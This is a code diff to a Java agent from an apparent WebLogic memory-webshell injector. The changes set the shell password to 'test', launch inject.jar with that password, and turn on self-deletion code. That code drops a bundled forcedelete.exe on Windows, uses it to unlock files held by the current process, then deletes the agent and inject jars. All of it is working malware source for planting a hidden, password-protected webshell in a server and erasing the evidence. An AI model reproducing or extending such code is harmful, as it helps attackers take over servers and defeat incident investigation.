@@ -15,7 +15,7 @@ public class Agent {
     public static PrintStream out = System.out;
     public static InstrumentationContext context = new InstrumentationContext();
     public static String currentPath;
-    public static String password = "rebeyond";
+    public static String password = "test";
     private final static String AGENT_NAME = "shell-agent.jar";
     private final static String INJECT_NAME = "inject.jar";
 
@@ -105,7 +105,7 @@ public class Agent {
     private static void startInject() throws Exception {
         Thread.sleep(3000);
         String tempFolder = System.getProperty("java.io.tmpdir");
-        String cmd = "java -jar " + tempFolder + File.separator + INJECT_NAME+" " + Agent.password;
+        String cmd = "java -jar " + tempFolder + File.separator + INJECT_NAME + " " + Agent.password;
         Runtime.getRuntime().exec(cmd);
 
     }
@@ -132,9 +132,6 @@ public class Agent {
         return result;
     }
 
-    public static void main(String[] args) throws Exception {
-        readInjectFile("C:\\Users\\fbi\\Documents\\javaProject\\weblogic_memshell\\inject\\target");
-    }
     public static void readInjectFile(String filePath) throws Exception {
         String fileName = INJECT_NAME;
         readFile(filePath, fileName);
@@ -154,8 +151,10 @@ public class Agent {
         byte[] bytes = new byte[1024 * 100];
         int num = 0;
         while ((num = is.read(bytes)) != -1) {
-            if (fileName.equals(AGENT_NAME)) agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
-            else if (fileName.equals(INJECT_NAME)) injectFileBytes =  mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
+            if (fileName.equals(AGENT_NAME))
+                agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
+            else if (fileName.equals(INJECT_NAME))
+                injectFileBytes = mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
         }
         is.close();
     }
@@ -168,17 +167,13 @@ public class Agent {
                 try {
 //                    System.out.println("delete path:" + currentPath);
                     Thread.sleep(5000);
-                    String injectFile = currentPath + "inject.jar";
-                    String agentFile = currentPath + "shell-agent.jar";
+                    String injectFile = currentPath + INJECT_NAME;
+                    String agentFile = currentPath + AGENT_NAME;
 
-                    String OS = System.getProperty("os.name").toLowerCase();
-                    //TODO exe打包不进去。windows暂且无法删除
-                    //                        try {
-                    //                            unlockFile(currentPath);
-                    //                        } catch (Exception e) {
-                    //                            System.out.println(e.getMessage());
-                    //                        }
-
+                    String os = System.getProperty("os.name").toLowerCase();
+                    if (os.contains("window")){
+                        unlockFile(currentPath);
+                    }
                     boolean delete1 = new File(injectFile).getCanonicalFile().delete();
                     boolean delete2 = new File(agentFile).delete();
 //                    if (delete1 && delete2) {
@@ -196,36 +191,36 @@ public class Agent {
 
     }
 
-//    public static void unlockFile(String currentPath) throws Exception {
-//        String exePath = currentPath + "forecedelete.exe";
-//        InputStream is = Agent.class.getClassLoader().getResourceAsStream("forcedelete.exe");
-//        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
-//        byte[] bytes = new byte[1024 * 100];
-//        int num = 0;
-//        if (is == null){
-//            System.out.println("exe 读取为空");
-//            return;
-//        }
-//        while ((num = is.read(bytes)) != -1) {
-//            fos.write(bytes, 0, num);
-//            fos.flush();
-//        }
-//        fos.close();
-//        is.close();
-//        Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid());
-//        try {
-//            process.waitFor();
-//        } catch (InterruptedException e) {
-//            // TODO Auto-generated catch block
-//            e.printStackTrace();
-//        }
-//        new File(exePath).delete();
-//    }
-//
-//    public static String getCurrentPid() {
-//        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
-//        return runtimeMXBean.getName().split("@")[0];
-//    }
+    public static void unlockFile(String currentPath) throws Exception {
+        String exePath = currentPath + "forecedelete.exe";
+        InputStream is = Agent.class.getResourceAsStream("/forcedelete.exe");
+        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
+        byte[] bytes = new byte[1024 * 100];
+        int num = 0;
+        if (is == null) {
+            System.out.println("exe 读取为空");
+            return;
+        }
+        while ((num = is.read(bytes)) != -1) {
+            fos.write(bytes, 0, num);
+            fos.flush();
+        }
+        fos.close();
+        is.close();
+        Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid());
+        try {
+            process.waitFor();
+        } catch (InterruptedException e) {
+            // TODO Auto-generated catch block
+            System.out.println(e.getMessage());
+        }
+        new File(exePath).delete();
+    }
+
+    public static String getCurrentPid() {
+        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
+        return runtimeMXBean.getName().split("@")[0];
+    }
 
 
 }
